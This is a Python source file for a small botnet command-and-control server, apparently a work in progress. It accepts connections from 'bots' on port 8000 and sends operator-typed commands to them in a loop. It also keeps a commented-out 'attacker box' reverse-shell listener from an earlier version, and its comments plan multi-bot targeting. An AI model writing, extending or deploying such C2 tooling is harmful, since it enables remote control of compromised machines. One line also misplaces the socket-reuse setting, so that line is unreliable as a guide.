import socketserver 
#from socket import *

#The following are holdovers from shellServer.py:
#It's possible that running these messes with the multiServer?
'''
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(('', serverPort))
serverSocket.listen(1)


print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()

print("Thanks for connecting to me " + str(addr))
message = connectionSocket.recv(1024)

print(message)
command =""

while command != "exit":
        command = input("Please enter a command: ")
        connectionSocket.send(command.encode())
        message = connectionSocket.recv(1024).decode()
        print(message)

connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
'''

class BotHandler(socketserver.BaseRequestHandler):

	#Handles the behaviour of the client connection
	def handle(self):
		self.data = self.request.recv(1024).strip()
		print("Bot with IP {} sent:".format(self.client_address[0]))
		print(self.data)
		#If we don't have the while loop, the connection is "handled"
		# once, but then once the method ends it just hangs
		# So, the loop ensures we can keep sending commands, BUT it also
		# takes up the entire process. 
		# So, we basically need to multithread
		#TODO: This will not work if we want to select which bots to send commands to.
		while True:
			#Now, let's figure out how to get it to send commands instead!
			command =""
			command = input("Please enter a command: ")
			self.request.sendall(command.encode())
			message = self.request.recv(1024).strip()	
			print(message)

if __name__ == "__main__":
	HOST, PORT = "", 8000

	# This line should remove an error that occurs when we try to reopen the socket quickly after closing it 
	tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
	socketserver.TCPServer.allow_reuse_address = True

	print("TCP Server enabled!")
	tcpServer.serve_forever()
